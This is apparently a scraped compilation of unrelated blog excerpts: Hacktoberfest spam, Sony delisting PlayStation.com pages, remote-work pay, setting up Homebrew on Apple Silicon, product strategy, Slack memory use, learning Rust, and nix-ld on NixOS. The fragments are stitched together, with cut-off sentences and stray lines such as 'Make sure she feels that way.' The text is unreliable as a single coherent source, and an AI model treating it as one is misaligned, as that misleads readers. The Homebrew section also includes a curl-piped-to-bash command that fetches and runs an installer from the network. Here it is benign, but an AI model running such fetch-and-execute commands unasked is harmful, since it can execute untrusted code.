goes further as almost any field of human life relies on our ability to see and can benefit from AR. The actual usage might differ a lot from representation shown in the Marvel Cinematic Universe or sci-fi films but it can definitely be a serious competitor — or at least a great addition — to screens.</p><p>Are you interested in developing an AR project or add augmented reality features to your app?

Still, better late than never, and the event has become such a phenomenon I’m happy I did finish the challenge (or like DigitalOcean calls it – the celebration)! The event has a special place in my heart, as it did (in 2017, I think?) encourage me to contribute more to the community – not only by maintaining this blog but also by occasionally submitting a Pull Request or two to whatever repositories I’ve found useful in my work.<span data-ez-name="koskila_net-box-3"></span></p><p>This year, however, I was more on the fence than ever before. Last year, there had been some complaints about the spamminess of the event; that it encourages quantity over quality. No matter whether your PRs (Pull Request) are accepted or not, you’ll get your shirt. It’s actually easy just to spam a few readme.md updates and be done with it.<span data-ez-name="koskila_net-medrectangle-3"></span></p><p>But this year, the problem got completely out of control. Twitter became kind of crazy with plenty of users tweeting about the absolutely useless pull requests their repositories were bombarded with.</p><p>Examples to follow:</p><figure><figcaption>Source: https://twitter.com/ShivamJoker/status/1314783210836955142?s=19</figcaption></figure><p><a href="https://twitter.com/hashtag/shitoberfest" target="_blank" rel="noreferrer noopener nofollow">#shitoberfest</a> started trending on Twitter.

            <!-- .entry-header -->


            <div>
                
<p>The heartbreak continues for those of us that relied on Sony’s websites to find and buy games or to research what was available. After <a href="https://delistedgames.com/sony-makes-it-official-playstation-3-psp-vita-removed-from-psn-website-between-october-21-and-26/">cutting out</a> older PlayStation content from the PlayStation Store over the past month, Sony’s eye has seemingly fallen on PlayStation.com and I find myself feeling gutted this morning. For those who didn’t use it regularly, PlayStation.com housed a gargantuan history of pages for North American PlayStation releases going all the way back to the original console from 1995. Up until this week you could easily find titles using the search box on the site but now anything before the PlayStation 4 returns a disappointing “<em>0 results found</em>“.</p>



<p>The older pages weren’t overflowing with info but they did offer some product details that I couldn’t easily find elsewhere. For newer games these pages also frequently retained links to the PlayStation Store which helped in my research. Even when they <em>were</em> on sale some games were just hard to find on the PlayStation Store while their PlayStation.com pages linked directly to them. Sometimes these pages were among the scant bits of evidence that I could find to confirm these games even existed digitally. Now, like with the changes to the PlayStation Store, all that’s gone too. Well, mostly gone.</p>



<p>Thankfully, like our “<a href="https://delistedgames.com/get-the-old-playstation-store-back-for-now/">old PS Store</a>” workaround, there’s still a way to search PlayStation.com but it might also eventually go away. Google’s “search within a site” function has been around for nearly a decade at this point but I’m sure lots of people don’t even know it exists. For our purposes just head to <em>the Google</em>, type ‘site:playstation.com’ and then whatever game you’re looking for. You can use Google’s other search operators to refine the results as well. Put it all together and it looks something like this: <strong>site:playstation.com “age of booty”</strong></p>



<p>You’ll get search results across the playstation.com domain including PlayStation Blog posts and PlayStation Store pages but look for the ones that specifically state ‘www.playstation.com’. In the case of Age of Booty the page gives us a description and even some screenshots as well as a ‘Buy Download’ link. Of course, the download page has been hidden by Sony’s recent changes to their sites but the URL remains accessible so you can check other territories or check it out using the “<a href="https://delistedgames.com/get-the-old-playstation-store-back-for-now/">old</a>” method. Yes, <a href="https://delistedgames.com/age-of-booty/">Age of Booty</a> is still delisted on PlayStation 3.</p>



<p>Maybe it was just a feature that only <strong><em>I</em></strong> benefited from but it’s really sad to see Sony ostensibly kill 25 years of PlayStation content on the web. It makes the nostalgia trip of Astro’s Playroom feel a little more hollow.</p>

            <p>Tough questions to ask your remote employer who gives you Cost Of Living based compensation and some thoughts on how remote compensation will work in the future</p>

Make sure she feels that way. <p>By the same token, as a remote worker, you shouldn’t let employers get away with paying you less just because you live in a cheaper city. “Equal pay for equal work” might be a dusty slogan, but it works for a reason. If with regard to compensation you accept being treated as a second-class worker based on location, you’re opening the door to being treated poorly on other matters as well.</p><p>- <a href="https://www.nityesh.com/books-read/#remote-office-not-required-by-david-heinemeier-hanson">Remote</a> by David Heinemeir Hanson and Jason Fried</p></blockquote><p>Almost all the knowledge jobs have become work-from-home in this sudden pandemic. Societies, companies, employees and job-seekers - all have been caught in this sudden shift in the way of working.</p><p>I am writing this for the new job-seekers. It's a tough market out there but you should still expect "equal pay for equal work" at whatever remote company you work for in the future.

Opening the doors to discrimination at work</h3><p>If you don't live in the highest wage city of the world, you might have a peer at the company who lives in a more expensive city than you. Are you ready to be treated as a second-class employee just because of the geography that you live in?</p><p><em>How will you know that all the lousy work doesn't get passed on to you because it is justified in terms of 'returns on investment'?</em></p><p>When your manager has the final say, isn't it possible that they distribute work so that a low-risk, low-impact project is assigned to you while your "more expensive" peers get assigned the high-risk, high impact one?</p><p><strong>HR at your COL company</strong><em>: "We have a policy that says we won't discriminate based on the employee's location."</em></p><p>That's all well and good but what about the silent bias.</p><p><em>How can you be sure that your extremely well-meaning manager wasn't thinking about it when they assign you a project that you don't like? Wouldn't they be making a wise decision that is justified in terms of returns of investment? Can you be sure that they won't?</em></p><h3 id="-2-differences-in-government-spending-across-countries">#2. Differences in Government spending across countries</h3><p>Public spending enables governments to produce and purchase goods and services, in order to fulfil their objectives – such as the provision of public goods or the redistribution of resources - like social protection, education and healthcare.</p><p>Recent data on public spending reveals substantial cross-country heterogeneity. Relative to low-income countries, government expenditure in high-income countries tends to be much larger (both in per capita terms, and as share of GDP), and it also tends to be more focused on social protection.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Yes!

      <h2><a href="https://soffes.blog/homebrew-on-apple-silicon">Homebrew on Apple Silicon</a></h2>
      <p>Posted on <time datetime="2020-11-17T00:00:00Z">November 17, 2020</time></p>
    </header>
    <p>Today, my new 13-inch MacBook Pro arrived! I was super excited to get it out of the box and set it up. This thing is fast! I am already very impressed. When I started setting up my development environment, things started to get a little frustrating. Have no fear, it’s solvable!</p>

<p>The biggest issue for me was <a href="https://brew.sh/" target="_blank" rel="noopener">Homebrew</a>. According to <a href="https://github.com/Homebrew/brew/issues/7857" target="_blank" rel="noopener">this issue</a> “There won’t be any support for native ARM Homebrew installations for months to come.” No big deal though. <mark>Homebrew can work just fine with Rosetta 2</mark> and some things work natively.</p>

<h2>Using Rosetta 2</h2>

<p>Rosetta 2 is Apple’s translation later. This lets you run Intel things with a little overhead. In Terminal, you can run any process with Rosetta by prefixing it with <code>arch -x86_64</code>.</p>

<p>To get Homebrew working, let’s install it using Rosetta:</p>
<pre>$ arch -x86_64 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
</pre>
<p>This command is the standard installer from <a href="https://brew.sh/" target="_blank" rel="noopener">brew.sh</a> with the Rosetta prefix. This will setup Homebrew in <code>/usr/local</code>. Now whenever you want to interact with it, you can run <code>arch -x86_64 brew …</code>. Easy enough!</p>

<p>If you want to wait for official support for Apple Silicon, feel free to stop reading here.</p>

<h2>Multiple Homebrews</h2>

<p>Homebrew does sorta work on Apple Silicon. See <a href="https://github.com/Homebrew/brew/issues/7857" target="_blank" rel="noopener">this issue</a> for the current status. OpenJDK and Go don’t work as of this writing and that blocks a lot of things. I was able to get Postgres, Redis, ImageMagick, rbenv, etc. all working natively though! To do this, you’ll need a second Homebrew.</p>

<p>Homebrew for Apple Silicon is expected to be installed in <code>/opt/homebrew</code> instead of the <code>/usr/local</code> you’re expecting. Let’s get that set up:</p>
<pre>$ sudo mkdir -p /opt/homebrew
$ sudo chown -R $(whoami):staff /opt/homebrew
$ cd /opt
$ curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew
</pre>
<p>This creates a new directory, setups the right permissions, and downloads Homebrew.</p>

<p>Be sure to add <code>/opt/homebrew/bin</code> to your <code>$PATH</code>!</p>

<p>Whichever <code>brew</code> is in your path first will run when you use <code>brew</code>. If it’s the <code>/usr/local</code> one, you’ll need to add the <code>arch -x86_64</code> prefix every time. Your best bet for using both is to alias one of them.</p>

<p>I made sure <code>/opt/homebrew/bin</code> was in my path <strong>before</strong> <code>/usr/local/bin</code>. Then I aliased the Intel <code>brew</code> to <code>ibrew</code> so it’s easier to select. Here’s what I added to my ZSH configuration:</p>
<pre>export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"
alias ibrew='arch -x86_64 /usr/local/bin/brew'
</pre>
<p>Now you can easily run <code>brew</code> to get the native one or <code>ibrew</code> to get the Rosetta one. You could of course do this in the other order in your <code>$PATH</code> if you prefer and something like <code>abrew</code> (for Apple Silicon Homebrew) or whatever else.</p>

<p>If you install things in both Homebrews, the one that is first in your path will be used.</p>

<p><strong>Disclaimer:</strong> This is as of 2020-11-17. Things are surely going to change. Follow along in <a href="https://github.com/Homebrew/brew/issues/7857" target="_blank" rel="noopener">this issue</a> for the latest from the Homebrew team.</p>

<p><strong>Update 2020-11-18:</strong> I realized both at the same time wasn’t working as I described. Updated the multi section.</p>

		<p>How can one recognize whether a product company has a chance to be truly successful, or well, it's doomed for a somewhat vegetative existence? If I had the decent answer to that problem, I'd probably be crazy rich already - so the fact is: <u>I don't</u>. But I think I can clearly recognize some symptoms indicating that the company's getting on <strong>a one-way highway to mediocrity</strong>.</p><p>The whole idea of the healthy, promising online platform is to <strong>(1)</strong> create something your customers want and <strong>(2)</strong> to keep the transactional cost (of adding &amp; operating yet another customer) as low as possible, preferably near-zero-ish. If you keep the 2nd condition met, the whole point is just (well, it's easier said than done, of course ...) to adjust all the knobs of your value proposition (the 1st condition) for your business to take off.</p><p>However, here's what happens in many companies: a salesperson enters the stage ...</p><blockquote>"There's an opportunity. The customer X wants a new summary view, a custom way of aggregating data, modified labels, and a dedicated sales report with XYZ format export option. That's a bit of work, but they indicate it's really important, so please estimate the effort needed - we'll add some margin on the top, charge the customer, and everyone will be happy."</blockquote><p>And everyone <u>should</u> be happy indeed, correct?</p><ol><li>we are the ones crafting the invoice, so we can assure that the income surpasses the estimated cost (effort)</li><li>we're addressing the need brought up directly by the customer - it's certainly an excellent way to maintain or even improve the relationship with that customer</li><li>we're keeping business running - turning effort into jingling coins</li></ol><p>Well, such a way of thinking can secure company's existence over the profitability line, but:</p><ul><li>such changes rarely (if so - by chance) contribute to the <strong>product vision</strong> - actually - quite the opposite, they have a significant chance to water it down; it's the customer who designs your platform (by expressing WHAT, not WHY) - do you remember what <a href="https://www.forbes.com/sites/forbesfinancecouncil/2017/10/19/on-building-a-faster-horse-design-thinking-for-disruption/">Henry Ford has said</a> about what would happen if he just followed what his customers wished for?</li><li>you may end up with a positive P&amp;L, but you're <strong>adding more liabilities</strong> (stuff to maintain) &amp; even if the cost of maintenance is covered in the calculation, you need to scale the organization for the sake of something only marginally beneficial (scaling is very expensive in non-tangible ways - communication, knowledge mgmt, etc.)</li><li>it's one of the surest ways to <strong>increase the complexity</strong> of your solution</li><li>such features and featurettes are <strong>harder to scrap</strong> (deprecate and decommission) later (the liability is "stronger")</li><li>and at last but not least - your key people <strong>waste time on horseshit</strong> that does not contribute to your org's mission, doesn't contribute to the competitive advantage, doesn't tackle critical problems and constraints - time is always the most critical resource: you are wasting it!</li></ul><hr><p>Why do the the companies fall into such traps? For two main reasons:</p><ol><li>because the organization is <strong>very sales-driven</strong> - the goal (most crucial KPI) is to bring revenue and worry later (about the cost/liabilities); such an organization doesn't have a strong product leadership and/or vision - this is purely project-oriented, not product-oriented thinking</li><li>because the organization's financial situation is unsafe and it looks for the low-hanging fruit - <u>implementing a requested feature is always easier</u> than evolutionary shaping a market-fit product; in the end - they <strong>sacrifice the product's coherent vision just to keep financial fluidity</strong>; or in other words - they put mere survival &amp; vegetation over plans &amp; ambitions - this is frequently a path of no return</li></ol><p>I'm not any platform business's owner, so you may find my suggestion naive and idealistic. Nevertheless, IMHO the answer should be to maintain the laser-sharp FOCUS. It's the only way if you want your product to succeed.</p><p>Keep your product portfolio small &amp; simple, your offering clear and self-explanatory. Ensure the identity of the product leaves no area for misinterpretation (it has to solve a particular, real-life problem!).</p><p>I realize that not doing what customer asks us to may seem counter-intuitive: you're rejecting easy money, you're denying opportunities, you're disappointing customers ... but service (project) and product companies require <strong>a drastically different way of thinking</strong>:</p><p>A typical <u>service company</u> ...</p><ul><li>... can afford thinking only about the direct project outcomes (fulfilling the goal set); complexity, maintenance, long-term consequences: these all are the purchaser's concerns</li><li>... is paid for ... conducting a service, not for how fruitful it turns out to be</li><li>...'s revenue is proportional to effort made (of course rates depend on specialties, seniority, risks, etc.)</li><li>... is a finite game business</li></ul><p>While a <u>product/platform company</u> ...</p><ul><li>... requires understanding (and careful planning) of the liabilities, commitments and maintenance efforts/costs - including which ones are fixed and which ones are variable</li><li>... should build its business upon of a replicable value proposition (create once, profit repeatedly)</li><li>... has virtually unlimited revenue potential (with a wide-enough target group and when addressing common-enough needs) - the income should NOT scale linearly with cost/effort</li><li>... is an infinite game business</li></ul>

It's flagship product is the extended chat service that aims to improve communication. The enhanced chat application with APIs for integrations with third party tools has seen immense success from startups with a handful of folk to enterprises like Blackberry, Bloomberg and VMWare adopting the communications tool at scale.</p><p>The messaging traffic going through this SaaS is incredibly large and the company has been able to keep it's<!-- --> <a href="https://slack.engineering/taking-php-seriously-cf7a60065329">PHP powered backend</a>&nbsp;chugging along fine under huge load reliably with<!-- --> <a href="https://stackshare.io/slack/slack">it's tech stack</a>. This is a critical area, because people will abandon a real time messaging plaform that is not… real time. Slack has done a good job scaling it's backend. Judging by popularity the team has excelled elsewhere as well.</p><p>A chat platform is only as good as it's client apps. In the contemporary working environment a number of devices are used on and off, and many people expect to be able to access Slack and other services from their desktops as well as mobile devices. Chats are increasingly being used as interfaces to other tools, as casual collaborative tasks like user generated content approvals are <a href="https://www.youtube.com/watch?v=3DTe6pDCx1w&amp;feature=youtu.be">done through API driven chatbots</a>.</p><p>The corporate chat arena is competitive — both the delivery service and the apps need to be top notch.</p><h2>Mem's the word</h2><p>The mobile apps for Android and iOS devices&nbsp;are generally regarded to be of high quality and you rarely hear negative feedback from them. In the desktop things are different. The main issue is the memory use by the clients, something the company itself has paid attention to:</p><blockquote>However, these capabilities come at a cost: the desktop client can use a lot of memory. This memory footprint increases as the user signs into more teams, as each team runs in its own webview. More memory usage means worse performance, degrading our customer’s experience of Slack and their other applications.<br>-&nbsp;<a href="https://slack.engineering/reducing-slacks-memory-footprint-4480fec7e8eb">Reducing Slack’s memory footprint</a></blockquote><p>The Slack desktop application is created with standard web technologies, with some helpers like <a href="https://slack.engineering/typescript-at-slack-a81307fa288d">Electron and TypeScript</a>.

This is a valid option, but there is a simpler way to manage this. In fact, you're using the best available Slack client as we speak. It's called the web browser.</p><p>Browsers are able to run tens, hundreds, even<!-- --> <a href="https://tech.slashdot.org/story/17/07/22/0236233/the-new-firefox-and-ridiculous-numbers-of-tabs">thousands of tabs</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Hello and welcome to the fifth post in my series about learning Rust. In case you want to hit it from the start, <a href="https://levpaul.com/posts/rust-lesson-1/">here’s</a> a link to the first one! This entire series covers my journey from being a completely land-locked Gopher to becoming (hopefully) a hardened Rustacean, able to skitter the hazardous seabed of any application safely.</p><hr><p>I can’t believe we’re at post number five! It’s been a wonderful ride, and I’ve been blown away by the helpful feedback from the Rust community at large. Thank you to everyone for all of the warm help.</p><p>Whilst I’m still in my infancy with Rust, it’s getting harder and harder to hold the itch to learn more. Often I want nothing more than to open the Rust Book and truck on with learning, blog posts be darned! However, I’ve made my commitment to myself, you and the Book, so every night; write, I do.</p><p>I’ve decided to make this post a <em>triple</em>, so let’s begin where we left off!</p><h3 id="7-packages-and-crates-and-stuffhttpsdocrust-langorgbookch07-00-managing-growing-projects-with-packages-crates-and-moduleshtmlmanaging-growing-projects-with-packages-crates-and-modules">7. <a href="https://doc.rust-lang.org/book/ch07-00-managing-growing-projects-with-packages-crates-and-modules.html#managing-growing-projects-with-packages-crates-and-modules">Packages and Crates and Stuff</a></h3><p>Right off the bat, I think this chapter is very well-placed. Even though it took me the entire chapter <em>grok</em> crates, modules and packages; I don’t think it came a line too early or late. Bravo! The chapter introduced many new keywords, such as <code>use</code>, <code>pub</code>, <code>mod</code>, <code>super</code>, but you walk away feeling like you can actually use them properly.</p><h4 id="modules">Modules</h4><p>Modules are introduced leaning heavily on the analogy of a file system… Now given that modules, at the most granular level, can be defined as single files <em>with the module name</em>, I’m actually wondering how much of this <em>is an analogy</em> and how much of it is really what’s happening at the compiler level. I would grin so hard if the bit about <strong><code>use</code></strong> being <em>like</em> a symlink <em>was</em> actually just a thing that was happening somewhere in the build chain. I’m sure it’s not though… Right.</p><h4 id="privacy">Privacy</h4><p>I enjoyed how the authors talked about privacy through scope. It helped me link project structure ideas with programming rules. For some reason I always thought of privacy as logical rules applied to code after the fact, rather than just having or not having something within a certain scope. It’s a lot easier to think about the later way. All this being said, there was also an overarching “Restaurant” example which they tried to tie in with privacy - check this gem:</p><blockquote><p>The way privacy works in Rust is that all items (functions, methods, structs, enums, modules, and constants) are private by default. […] To continue with the restaurant metaphor, think of the privacy rules as being like the back office of a restaurant: what goes on in there is private to restaurant customers, but office managers can see and do everything in the restaurant in which they operate.</p></blockquote><p>… I think that metaphor died somewhere in the rafters above the restaurant, and the smell could be starting to affect the food. Sorry.</p><p>For those who don’t know, privacy in Go is defined by whether you capitalize the first letter of your func/struct/interface name. Whilst lean and consistent - I much prefer the Rust approach. Rust is private by default unless you plop a <code>pub</code> in front of it. The main irk I have with the Go way is that Go’s naming convention also tells you acronyms should be entirely uppercase. So what happens when you want a private struct called <code>jsonData</code>? Well you have to think of something else because calling it <code>JSONData</code> will make it publicly exported and <code>jsonData</code> is not idiomatic. It’s definitely but only a nit, however I’ve become (unreasonably?) irked by it on more than one occasion.</p><h5 id="clean-your-room">Clean your room!</h5><p>The lesson proved once again that the Rust compiler is helpful. Gentle warnings about my variables being unused really makes me feel cared for. Go isn’t like this. Go grabs you by your collar and pierces your eardrums with a shrewd screech. It won’t let you go either. Like a harpy, the tiny chipmunk won’t let up. Thank Crabby for small mercies is all I can say.</p><p>On a more serious note though, I like this choice by Rust - my preference for most things I’d code would be to enforce compiler errors for unused variables; but it should be a compiler option; which as far as I know - it is <strong>not</strong>, in Go. I’m going to guess you should be able to upgrade the Rust warnings to errors through compiler flags somehow.</p><h5 id="re-exporting-imports">Re-exporting Imports</h5><p>This <a href="https://doc.rust-lang.org/book/ch07-04-bringing-paths-into-scope-with-the-use-keyword.html#re-exporting-names-with-pub-use">feature</a> of Rust gives me mixed feelings. As I understand it, when you <code>use</code> a package, that package can then bring more packages into your scope? I mean it does make sense from a library user-experience perspective, but I can’t help but feel like there’s a bit of trust going on here, if not only taste-trust. It’s definitely nice to just <code>use</code> a crate once and have everything you need to interact with it.</p><p>There’s only one Rust project I’m really interested in right now - a Game engine and editor called <a href="https://github.com/mrDIMAS/rg3d">rg3d</a>. I checked that project’s source for re-exports and found some in the top level <a href="https://github.com/mrDIMAS/rg3d/blob/master/src/lib.rs"><code>lib.rs</code></a>. Basically it just imports its own submodules publicly. I have no idea if this is idiomatic but to my lay-eyes this use-case looks correct and just.</p><p>Rust has been giving me a strong Java vibe from its imports. The nested paths feature seems good - ugly but succinct. Maybe my editor or <code>rustfmt</code> will automatically manage this for me? I enjoy not needing to worry about imports 99% of the time in Go, thanks to <code>goimports</code>, so hopefully that trend will continue in Rust.</p><h5 id="prelude-to-nothing">Prelude to Nothing</h5><p>In previous posts I mentioned being wooed by wistful mentions of a <code>prelude</code> by the Book. Well this chapter mentioned it again, and more than wistfully. It drowned my unquenchable satiety with <a href="https://doc.rust-lang.org/std/prelude/index.html">this link</a>, which to my utmost sorrow, was not a chapter in the Book. Alas, I read it in spite the fact. Oh, but my heart was flattened like my toddler’s playdough on a Sunday morning, for I was to find <strong>the prelude</strong> means nothing more than the default set of imports for a program. Through the sobriety of hindsight, I do question what else I was expecting. Given Rust doesn’t have a runtime, it doesn’t need anything fancy. Oh well, at least the great prelude mystery is solved.</p><h3 id="8-common-collectionshttpsdocrust-langorgbookch08-00-common-collectionshtml"><a href="https://doc.rust-lang.org/book/ch08-00-common-collections.html">8. Common Collections</a></h3><p>I just want to take a moment to swoon over Rust’s type inference again.</p><p>*<em><strong>swoons</strong></em>*</p><p>It’s fantastic. This is all…</p><hr><p>Now for actual chapter 8; it’s fairly dense. Covered is a brief introduction of standard library’s collections, Vectors, HashMaps and finally a deep dive into Rust Strings. Let’s begin the blow-by-blow starting with this gem:</p><div><pre><code data-lang="rust"><span>fn</span> <span>main</span><span>()</span><span> </span><span>{</span><span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>1</span><span>,</span><span> </span><span>2</span><span>,</span><span> </span><span>3</span><span>,</span><span> </span><span>4</span><span>,</span><span> </span><span>5</span><span>];</span><span>
</span><span>    </span><span>let</span><span> </span><span>first</span><span> </span><span>=</span><span> </span><span>&amp;</span><span>v</span><span>[</span><span>0</span><span>];</span><span>
</span><span>    </span><span>v</span><span>.</span><span>push</span><span>(</span><span>6</span><span>);</span><span>
</span><span>    </span><span>println</span><span>!</span><span>(</span><span>"The first element is: {}"</span><span>,</span><span> </span><span>first</span><span>);</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>Guess what won’t compile? Correct - the code above! What’s happening here is that <code>v</code> is mutable and <code>first</code> is immutable. If <code>v</code> needs to grow from something like a push; then this may end up moving the entire heap-allocated vector into another part of the heap. Had this to happen, then <code>first</code> would be a “dangling” ref to what <em>used</em> to be the first element of <code>v</code>.</p><p>Now what really tickles me is wondering about how that enforcement is encoded - what is <code>first</code> a reference to exactly? The Vec? No, my IDE tells me it’s an <code>&amp;i32</code> ref… But, somehow the compiler knows that <em>THAT</em> i32 ref is a child, or related to the Vec in the same scope. I
’d love to know more about how this works.</p><p>Perhaps not by major coincidence the Book offers up possibly the most perfect lead for such questions only paragraphs later… The Book introduces the <a href="https://doc.rust-lang.org/nomicon/vec.html">Rustinomicon</a>, telling us that we can peer into it to see details about how <code>vec</code> is made… At first, I was a little tense. Why does this reference-style-looking book have the Lovecraftian name? Only when I glimpsed the first line of its opening, did the ink droplets align:</p><h3 id="the-dark-arts-of-unsafe-rust"><code>The Dark Arts of Unsafe Rust</code></h3><p>…<em>followed by</em></p><p>THE KNOWLEDGE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF UNLEASHING INDESCRIBABLE HORRORS THAT SHATTER YOUR PSYCHE AND SET YOUR MIND ADRIFT IN THE UNKNOWABLY INFINITE COSMOS.</p><h4 id="okay-this-looks-awesome"><strong>OKAY THIS LOOKS AWESOME</strong>.</h4><p>Flipping back to the <code>vec</code> chapter of the Rustinomicon, I realised it’s not at all a boring appendix style libdoc for vectors - the god damn tomb is teaching you to write your <em>OWN</em> std::Vec from scratch!</p><p>Good God, this is made me bite my lip in awkward nuclear attraction. I had some plans in mind for what I wanted to write about after this series. Right now the thought of doing a mini-series through the nomcon is sounding mighty fine though.. <em>More to come on this later</em>, as I managed to pry myself away and back to the lesson at hand.</p><hr><p>Looking through the method list (by god the <a href="https://doc.rust-lang.org/std/vec/struct.Vec.html">doc pages</a> are ugly; hint - only use the sidebar to navigate, do not bother free-scrolling), <code>vec</code> REALLY has some cool funcs. <code>dedup</code>, <code>drain</code>, <code>retain</code> all look to do what you’d expect. I jaunted quickly through <a href="https://doc.rust-lang.org/std/iter/trait.Iterator.html"><code>std::iter:Iterator</code></a> too and found SO many nice to haves, such as <code>gt</code>, <code>is_sorted</code>, <code>map</code>, <code>fold</code>, <code>filter</code>…</p><p>Seriously, I know there’s a lot you wouldn’t need here - but I really do wish we had simple collections/traits outside of slices and maps in Go. And yes, before I get screamed at - <em>I know</em> you can write your own in <a href="https://gobyexample.com/collection-functions">a few lines</a>, but it’s not the same - especially when you start involving complex data types.

<p>Nixpkgs maintains the highest rating on <a href="https://repology.org/">Repology</a> for having the most packages &amp; which are up to date. Unfortunately even with the current ecosystem of packages, there will always be gaps, and for beginners in NixOS a common question is:</p>

<p><em>“I’ve download a binary and would like to run it on NixOS”</em></p>

<p><strong>Can we do better &amp; streamline running non-Nix software?</strong> 🤔</p>

<p>This was some of the questions posed by some Nix contributors and I wanted to capture the ideas put forward for others.</p>

<!--more-->

<h2 id="a-brief-tour-of-linking">A brief tour of linking</h2>

<p>Without going into a ton of detail about how dynamic libraries are performed on Linux; a Linux binary - <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF format</a> - contains information pertaining to the dynamic libraries necessary for the binary.</p>

<p>For instance, here is a non-NixOS Ruby installation.</p>
<div><div><pre><code>❯ readelf <span>-d</span> <span>$(</span>which ruby<span>)</span> | <span>grep </span>NEEDED
 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libruby-2.7.so.2.7]
 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libc.so.6]
</code></pre></div></div>
<p>It requires two dynamic libraries <em>libruby</em> &amp; <em>libc</em>. These libraries may themselves have other dependencies, so we can use <strong>ldd</strong> to recursively find the dependency closure.</p>

<div><div><pre><code>❯ ldd <span>$(</span>which ruby<span>)</span>
    linux-vdso.so.1 <span>(</span>0x00007ffed1705000<span>)</span>
    /lib/x86_64-linux-gnu/libnss_cache.so.2 <span>(</span>0x00007f3626cd0000<span>)</span>
    libruby-2.7.so.2.7 <span>=&gt;</span> /lib/x86_64-linux-gnu/libruby-2.7.so.2.7 <span>(</span>0x00007f3626960000<span>)</span>
    libc.so.6 <span>=&gt;</span> /lib/x86_64-linux-gnu/libc.so.6 <span>(</span>0x00007f362679b000<span>)</span>
    libpthread.so.0 <span>=&gt;</span> /lib/x86_64-linux-gnu/libpthread.so.0 <span>(</span>0x00007f3626779000<span>)</span>
    librt.so.1 <span>=&gt;</span> /lib/x86_64-linux-gnu/librt.so.1 <span>(</span>0x00007f362676e000<span>)</span>
    libgmp.so.10 <span>=&gt;</span> /lib/x86_64-linux-gnu/libgmp.so.10 <span>(</span>0x00007f36266eb000<span>)</span>
    libdl.so.2 <span>=&gt;</span> /lib/x86_64-linux-gnu/libdl.so.2 <span>(</span>0x00007f36266e3000<span>)</span>
    libcrypt.so.1 <span>=&gt;</span> /lib/x86_64-linux-gnu/libcrypt.so.1 <span>(</span>0x00007f36266a8000<span>)</span>
    libm.so.6 <span>=&gt;</span> /lib/x86_64-linux-gnu/libm.so.6 <span>(</span>0x00007f3626564000<span>)</span>
    /lib64/ld-linux-x86-64.so.2 <span>(</span>0x00007f3626cde000<span>)</span>
</code></pre></div></div>

<p>We can see here that <strong>ldd</strong> resolved the libraries to locations in my <a href="https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard">Filesystem Hierarchy Standard</a>(FHS).</p>

<p>This is <em>not hermetic</em>, as the FHS is a global shared state across my machine.
This is the exact problem that Nix itself wants to address.</p>

<blockquote>
  <p>I’m on a Debian distro at the moment.</p>
</blockquote>

<p>Nix addresses this generally by patching the ELF header to <em>fully specify</em> where the shared libraries can be found in the <em>/nix/store</em>; so that they are not resolved or searched on the FHS.</p>

<div><div><pre><code>❯ readelf -d $(which ruby) | grep RUNPATH
 0x000000000000001d (RUNPATH) Library runpath:
 [/nix/store/z5lira1853d97gbmv1qbdjjpkjn7ksj8-ruby-2.6.6/lib:
 /nix/store/8fcxqg8dmwlkjw2vgkgz607kr5jy552w-zlib-1.2.11/lib:
 /nix/store/kah5n342wz4i0s9lz9ka4bgz91xa2i94-glibc-2.32/lib]
</code></pre></div></div>

<p>This <em>patching</em> however relies on the Nix <em>stdenv</em> derivation builder and ultimately is what makes binaries in Nix work.</p>

<blockquote>
  <p>Nix actually takes it a step further and patches the linker so that it does not even try to check the FHS.</p>
</blockquote>

<p>Binaries downloaded from the Internet are not patched. What can be done?</p>

<h2 id="interpreter">Interpreter</h2>

<p>A key insight into the bootstrapping of an ELF binary in Linux is the <em>interpreter</em>, whose presence is there to help satisfy any dynamic linkage.</p>

<p>Let’s take a look again at my non-Nix Ruby binary</p>

<div><div><pre><code>❯ readelf <span>-l</span> <span>$(</span>which ruby<span>)</span> | <span>grep </span>interpreter
      <span>[</span>Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
</code></pre></div></div>

<blockquote>
  <p>Nix built binaries use a <a href="https://github.com/NixOS/patchelf">patchelf</a> utility that not only sets the <em>RUNPATH</em> to pin libraries but also changes the interpreter to one in the <em>/nix/store</em></p>
</blockquote>

<p>It is the interpreter’s goal to find the libraries listed in the ELF file either via the <em>RUNPATH</em>, <em>LD_LIBRARY_PATH</em> or the <em>FHS</em> well known directories.</p>

<p>⚠️ On NixOS <code>/lib64/ld-linux-x86-64.so.2</code> normally <strong>does not exist</strong> and as a result you will be greeted with an unfriendly <em>“bad ELF interpreter: No such file or directory”</em> error.</p>

<h2 id="nix-ld">nix-ld</h2>

<p>We have a binary that needs some shared libraries &amp; the bootstrapping process calls out to the interpreter set in the ELF header.</p>

<p>💡 Let’s put a <em>fake</em> interpreter on NixOS machines!</p>

<blockquote>
  <p>This idea works since the path of Linux <em>ld</em> is well known for each distribution.</p>
</blockquote>

<p>For instance, NixOS machines can place an entry at <em>/lib64/ld-linux-x86-64.so.2</em> for a custom binary that can help resolve dynamic libraries <strong>at runtime</strong> to libraries within the <em>/nix/store</em>.</p>

<p>This is in fact what <a href="https://github.com/Mic92">Mic92</a> has started with his project <a href="https://github.com/Mic92/nix-ld">nix-ld</a>.</p>

<p>How can our custom <em>ld</em> locate the necessary libraries though? This is where we can get really crazy. 🤪</p>

<p>We can use <a href="https://github.com/bennofs/nix-index">nix-index</a> – a files database for nixpkgs – to locate packages in Nix that provide the necessary library. 🤯</p>

